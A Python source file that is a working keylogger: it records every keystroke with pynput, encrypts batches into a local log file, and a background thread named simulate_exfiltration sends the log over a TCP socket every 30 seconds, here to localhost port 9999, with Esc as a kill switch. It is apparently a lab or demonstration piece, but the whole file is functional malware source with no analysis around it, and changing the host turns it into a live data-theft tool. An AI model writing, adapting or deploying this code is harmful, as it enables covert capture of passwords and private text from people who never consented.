import os, base64, socket, threading, time
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

KEY_FILE = 'key.key'
if not os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'wb') as f:
        f.write(Fernet.generate_key())
with open(KEY_FILE, 'rb') as f:
    key = f.read()
fernet = Fernet(key)


LOG_FILE = 'encrypted_logs.txt'
KILL_SWITCH = 'esc' 

buffer = []

def encrypt_and_store(log_data):
    encrypted = fernet.encrypt(log_data.encode())
    with open(LOG_FILE, 'ab') as f:
        f.write(encrypted + b'\n')

def on_press(key):
    global buffer
    try:
        buffer.append(key.char)
    except AttributeError:
        buffer.append(f'<{key.name}>')
    if len(buffer) >= 10:
        save_buffer()

    if key == keyboard.Key.esc:
        save_buffer()
        return False 

def save_buffer():
    global buffer
    if buffer:
        data = ''.join(buffer)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        encrypt_and_store(f'[{timestamp}] {data}')
        buffer = []

def simulate_exfiltration():
    while True:
        time.sleep(30)
        try:
            with open(LOG_FILE, 'rb') as f:
                logs = f.read()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('localhost', 9999))
            sock.sendall(logs)
            sock.close()
        except Exception:
            pass

def start():
    threading.Thread(target=simulate_exfiltration, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    start()
